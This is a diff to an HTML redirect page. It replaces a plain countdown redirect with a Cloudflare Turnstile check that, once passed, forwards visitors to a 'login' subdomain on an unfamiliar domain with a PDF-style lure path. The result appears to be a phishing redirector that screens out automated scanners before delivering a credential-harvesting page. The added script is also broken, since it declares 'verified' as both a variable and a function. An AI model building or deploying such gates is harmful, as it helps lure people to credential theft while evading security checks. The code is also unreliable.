@@ -3,69 +3,41 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="noindex, nofollow, noarchive">
-  <meta name="referrer" content="no-referrer">
-  <title>Please wait</title>
-
-  <style>
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      font-family: Arial, sans-serif;
-      background: #f4f7fb;
-      color: #172033;
-    }
-
-    .box {
-      padding: 40px;
-      text-align: center;
-      background: white;
-      border-radius: 14px;
-      box-shadow: 0 10px 30px #0002;
-    }
-
-    .spinner {
-      width: 40px;
-      height: 40px;
-      margin: 0 auto 20px;
-      border: 4px solid #ddd;
-      border-top-color: #2563eb;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-  </style>
+  <title>Redirecting</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
-
 <body>
-  <main class="box">
-    <div class="spinner"></div>
-    <h1>Please wait</h1>
-    <p>Continuing in <span id="seconds">5</span> seconds...</p>
-  </main>
+  <div
+    class="cf-turnstile"
+    data-sitekey="0x4AAAAAAE_BMK-3H1GaeDw2"
+    data-callback="verified">
+  </div>
 
   <script>
-    const destination = "https://example.com/your-destination";
-    let seconds = 5;
+    let verified = false;
 
-    const counter = document.getElementById("seconds");
+    async function verified(token) {
+      if (verified) return;
+      verified = true;
 
-    const timer = setInterval(() => {
-      seconds--;
-      counter.textContent = seconds;
+      // Send the token to your server for verification.
+      const response = await fetch("/api/verify", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ token })
+      });
 
-      if (seconds <= 0) {
-        clearInterval(timer);
-        window.location.replace(destination);
+      if (!response.ok) {
+        verified = false;
+        return;
       }
-    }, 1000);
+
+      setTimeout(() => {
+        window.location.assign("https://login.fudgekic.biz/view/project-details.pdf");
+      }, 2000);
+    }
   </script>
 </body>
 </html>
